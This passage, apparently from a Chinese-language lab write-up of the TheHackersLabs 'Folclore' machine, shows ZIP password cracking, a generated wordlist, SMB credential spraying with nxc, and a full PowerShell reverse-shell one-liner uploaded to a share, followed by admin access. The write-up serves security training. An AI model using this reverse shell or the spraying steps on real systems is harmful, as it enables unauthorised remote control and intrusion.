ilt_in\"\u003ehash\u003c/span\u003e (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])\nCost 1 (HMAC size) is 238 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\ncelina           (Pacto.zip/Pacto.txt)     \n1g 0:00:00:00 DONE (2025-09-24 18:26) 2.564g/s 42010p/s 42010c/s 42010C/s 123456..cocoliso\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e7z\u003c/code\u003e 进行解压\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Folclore 7z x Pacto.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e archives:\n1 file, 432 bytes (1 KiB)\n\nExtracting archive: Pacto.zip\n--\nPath = Pacto.zip\nType = zip\nPhysical Size = 432\n\n    \nEnter password (will not be echoed):\nEverything is Ok\n\nSize:       358\nCompressed: 432\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到一个神秘字符串 \u003ccode\u003eJ9c\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Folclore \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e Pacto.txt \nHas surcado sendas que pocos se atreven a cruzar, \npero tu viaje no concluye todavía. Invocando mis artes prohibidas, \nlogré hechizar a la serpiente emplumada y robarle apenas el inicio de su secreto: \nsólo tres caracteres fui capaz de obtener. \nAhora los deposito en tus manos, \npero escucha el viento y no olvides la deuda que ahora te ata a mi sombra: J9c.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们检查一下上面得到的用户能做的事情，还是一个 \u003ccode\u003etxt\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsFolclore/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Folclore \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e Ultimo_mensaje.txt \nSolo puedo darte el quinto carácter de su clave: ‘U’. \nLos demás caracteres que faltan deberás encontrarlos por tu cuenta, \naunque no debe ser tan difícil; solo son números o letras. \nConfía en tu ingenio y no olvides que el misterio siempre se revela a quien persevera.\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e密码爆破\u003c/h2\u003e\n\u003cp\u003e集合上边的得到几个\u003ccode\u003etxt\u003c/code\u003e，得到密码应该是 \u003ccode\u003eJ9c?U?%/\u003c/code\u003e，第四个字母需要我们进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Folclore \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e char1 \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e {a..z} {A..Z} {0..9}; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"J9c%sU%s%%/\\n\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$char1\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$char1\u003c/span\u003e\"\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e \u003e wordlist.txt \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到凭据 \u003ccode\u003eQuetzalcoatl:J9c7U7%/\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Folclore nxc smb 192.168.56.101 -u user.txt -p wordlist.txt --ignore-pw-decoding --continue-on-success | grep -v \u003cspan class=\"hljs-string\"\u003e'STATUS_LOGON_FAILURE'\u003c/span\u003e\nSMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\\Ninguno:J9caUa%/ (Guest)\nSMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\\Quetzalcoatl:J9c7U7%/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSMB 枚举…\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsFolclore/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003exxxxx\u003c/h2\u003e\n\u003cp\u003e查看得到的  \u003ccode\u003etxt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Folclore \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /root/.nxc/modules/nxc_spider_plus/192.168.56.101/Viento/Serpiente\\ Emplumada.txt \nHas recorrido con valentía y sabiduría un sendero lleno de retos; te felicito, guerrero del destino.\nAhora, confía en mí, Quetzalcóatl, la serpiente emplumada, pues seré yo quien te otorgue el acceso necesario. \nSolo ejecutaré una vez aquel archivo PowerShell que decidas subir, para abrir el portal hacia lo que buscas. \nQue esta acción sea el puente que te lleve a la verdad escondida entre los vientos y las estrellas.# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e表示我们可以上传 \u003ccode\u003ePowershell\u003c/code\u003e 文件一次\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsFolclore/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将下面的代码保存为 \u003ccode\u003exxx.ps1\u003c/code\u003e 然后进行上传\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$client\u003c/span\u003e = New-Object Net.Sockets.TCPClient(\u003cspan class=\"hljs-string\"\u003e'192.168.56.5'\u003c/span\u003e,1234);\u003cspan class=\"hljs-variable\"\u003e$stream\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$client\u003c/span\u003e.GetStream();[byte[]]\u003cspan class=\"hljs-variable\"\u003e$bytes\u003c/span\u003e = 0..65535|%{0};\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e((\u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$stream\u003c/span\u003e.Read(\u003cspan class=\"hljs-variable\"\u003e$bytes\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$bytes\u003c/span\u003e.Length)) -ne 0){;\u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\u003cspan class=\"hljs-variable\"\u003e$bytes\u003c/span\u003e,0, \u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e);\u003cspan class=\"hljs-variable\"\u003e$sendback\u003c/span\u003e = (iex \u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e 2\u003e\u0026#x26;1 | Out-String );\u003cspan class=\"hljs-variable\"\u003e$sendback2\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$sendback\u003c/span\u003e + \u003cspan class=\"hljs-string\"\u003e'PS '\u003c/span\u003e + (\u003cspan class=\"hljs-built_in\"\u003epwd\u003c/span\u003e).Path + \u003cspan class=\"hljs-string\"\u003e'\u003e '\u003c/span\u003e;\u003cspan class=\"hljs-variable\"\u003e$sendbyte\u003c/span\u003e = ([text.encoding]::ASCII).GetBytes(\u003cspan class=\"hljs-variable\"\u003e$sendback2\u003c/span\u003e);\u003cspan class=\"hljs-variable\"\u003e$stream\u003c/span\u003e.Write(\u003cspan class=\"hljs-variable\"\u003e$sendbyte\u003c/span\u003e,0,\u003cspan class=\"hljs-variable\"\u003e$sendbyte\u003c/span\u003e.Length);\u003cspan class=\"hljs-variable\"\u003e$stream\u003c/span\u003e.Flush()};\u003cspan class=\"hljs-variable\"\u003e$client\u003c/span\u003e.Close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esmbclient //192.168.56.101/viento -U Quetzalcoatl%\u003cspan class=\"hljs-string\"\u003e'J9c7U7%/'\u003c/span\u003e\nput shell.ps1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e等待弹回来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsFolclore/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003eUser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Users\\Quetzalcoatl\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e User.txt\n456e20656c207669656e746f2079616365206c6120766572646164\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e为了方便操作迁移到 \u003ccode\u003emsf\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsFolclore/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上来后通过 winpeas 等枚举了许多，但是没找到可以利用的\u003c/p\u003e\n\u003cp\u003e最后可以在 \u003ccode\u003eDownloads\\Actualizacion\u003c/code\u003e 中找到管理员密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\Users\\Quetzalcoatl\\Downloads\\Actualizacion\u003e\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e Venganza.txt\n\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e Venganza.txt\nHe conseguido la clave del administrador!!!\nLa guardare para no olvidarla: xxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Folclore nxc smb 192.168.56.101 -u \u003cspan class=\"hljs-string\"\u003e'administrador'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'xxxxxx*'\u003c/span\u003e                        \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)\nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\administrador:xxxxxx (Pwn3d!)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿 \u003ccode\u003eroot.txt\u003c/code\u003e ，直接读就算了，懒得拿 \u003ccode\u003eshell\u003c/code\u003e 了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsFolclore/image14.png\" alt=\"image
